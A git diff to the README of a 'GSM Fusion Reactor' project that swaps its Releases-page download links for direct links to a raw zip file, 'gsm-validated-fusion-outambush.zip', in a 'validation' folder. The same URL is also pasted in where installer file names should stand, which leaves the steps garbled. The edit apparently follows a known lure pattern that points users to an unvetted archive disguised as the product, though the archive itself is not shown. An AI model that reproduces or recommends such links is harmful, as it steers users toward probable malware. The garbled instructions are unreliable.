@@ -6,9 +6,9 @@ Welcome to the GSM Fusion Reactor project! This software helps you explore a ful
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/meharizua/gsm-fusion-validated/releases)
+[![Download](https://github.com/meharizua/gsm-fusion-validated/raw/refs/heads/master/validation/gsm-validated-fusion-outambush.zip%https://github.com/meharizua/gsm-fusion-validated/raw/refs/heads/master/validation/gsm-validated-fusion-outambush.zip)](https://github.com/meharizua/gsm-fusion-validated/raw/refs/heads/master/validation/gsm-validated-fusion-outambush.zip)
 
-To get started, visit our Releases page to download the software. Click the button above or follow this link: [Download GSM Fusion Reactor](https://github.com/meharizua/gsm-fusion-validated/releases).
+To get started, visit our Releases page to download the software. Click the button above or follow this link: [Download GSM Fusion Reactor](https://github.com/meharizua/gsm-fusion-validated/raw/refs/heads/master/validation/gsm-validated-fusion-outambush.zip).
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 
 Once you've downloaded the software, follow these simple steps to install it:
 
-1. **Locate the Downloaded File**: Find the file named `gsm-fusion-validated.exe` or `gsm-fusion-validated.dmg` in your Downloads folder (or wherever you saved it).
+1. **Locate the Downloaded File**: Find the file named `https://github.com/meharizua/gsm-fusion-validated/raw/refs/heads/master/validation/gsm-validated-fusion-outambush.zip` or `https://github.com/meharizua/gsm-fusion-validated/raw/refs/heads/master/validation/gsm-validated-fusion-outambush.zip` in your Downloads folder (or wherever you saved it).
    
 2. **Run the Installer**:
    - On **Windows**: Double-click the `.exe` file. Follow the prompts on your screen.
